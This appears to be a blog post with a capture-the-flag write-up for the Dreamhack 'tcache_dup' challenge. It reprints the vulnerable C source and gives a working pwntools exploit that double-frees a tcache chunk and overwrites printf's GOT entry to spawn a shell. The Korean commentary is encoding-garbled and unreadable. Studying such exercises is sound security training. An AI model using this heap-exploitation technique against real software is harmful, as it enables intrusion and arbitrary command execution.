---
title:  "TIL: tcache poisoning 1 ğŸ—ƒï¸ "
excerpt: "2022.08.22 TIL âœ"
toc: true
toc_sticky: true

categories:
  - TIL
  - Hacking
---

## Wargame: [tcache_dup](https://dreamhack.io/wargame/challenges/60/)

ë¬¸ì œì˜ ì†ŒìŠ¤ ì½”ë“œëŠ” ì•„ë˜ì™€ ê°™ë‹¤.

```c
// gcc -o tcache_dup tcache_dup.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char *ptr[10];

void alarm_handler() {
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int create(int cnt) {
    int size;

    if(cnt > 10) {
        return -1;
    }
    printf("Size: ");
    scanf("%d", &size);

    ptr[cnt] = malloc(size);

    if(!ptr[cnt]) {
        return -1;
    }

    printf("Data: ");
    read(0, ptr[cnt], size);
}

int delete() {
    int idx;

    printf("idx: ");
    scanf("%d", &idx);

    if(idx > 10) {
        return -1;
    }

    free(ptr[idx]);
}

void get_shell() {
    system("/bin/sh");
}

int main() {
    int idx;
    int cnt = 0;

    initialize();

    while(1) {
        printf("1. Create\n");
        printf("2. Delete\n");
        printf("> ");
        scanf("%d", &idx);

        switch(idx) {
            case 1:
                create(cnt);
                cnt++;
                break;
            case 2:
                delete();
                break;
            default:
                break;
        }
    }

    return 0;
}
```

### Vulnerability Scanning

- `checksec`
    
    <p align="center">
        <a href="/assets/images/TIL220822/Untitled.png">
            <img src="/assets/images/TIL220822/Untitled.png" width="400">
        </a>
    </p>
- `create`ì„ ì´ìš©í•´ ì›í•˜ëŠ” sizeë¡œ `malloc`ì„ ì‹¤í–‰í•  ìˆ˜ ìˆê³ , ê·¸ ì•ˆì— dataë¥¼ ì…ë ¥í•  ìˆ˜ ìˆë‹¤.
- `free`ë¥¼ ì´ìš©í•´ allocateí•œ chunk ì¤‘ ì›í•˜ëŠ” chunkë¥¼ freeí•  ìˆ˜ ìˆë‹¤.
- `get_shell`ì„ ì‹¤í–‰í•˜ë©´ shellì„ íšë“í•  ìˆ˜ ìˆë‹¤.

### Exploit

```python
from pwn import *

#p = process("./tcache_dup")
p = remote("host3.dreamhack.games", 9302)
#gdb.attach(p)
e = ELF("./tcache_dup")

def create(size, data):
    p.sendlineafter("> ", "1")
    p.sendlineafter("Size: ", str(size))
    p.sendafter("Data: ", data)

def delete(idx):
    p.sendlineafter("> ", "2")
    p.sendlineafter("idx: ", str(idx))

create(0x30, "AAAA")
delete(0)
delete(0)

printf_got = e.got["printf"]
get_shell = e.symbols["get_shell"]

create(0x30, p64(printf_got))
create(0x30, "AAAA")
create(0x30, p64(get_shell))

p.interactive()
```

- ë¬¸ì œì˜ ì„œë²„ì—ì„œ ì‚¬ìš©ì¤‘ì¸ libcì˜ ë²„ì „ì—ì„œëŠ” ì•ì„œ ì„¤ëª…í•œ `tcache_entryâ†’key`ë¥¼ í™œìš©í•œ **DFB ë°©ì§€ê¸°ë²•ì„ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ”ë‹¤.** ë”°ë¼ì„œ ê·¸ëƒ¥ freeë¥¼ ë‘ ë²ˆ ì‹¤í–‰í•˜ì—¬ DFBë¥¼ ì¼ìœ¼í‚¬ ìˆ˜ ìˆë‹¤.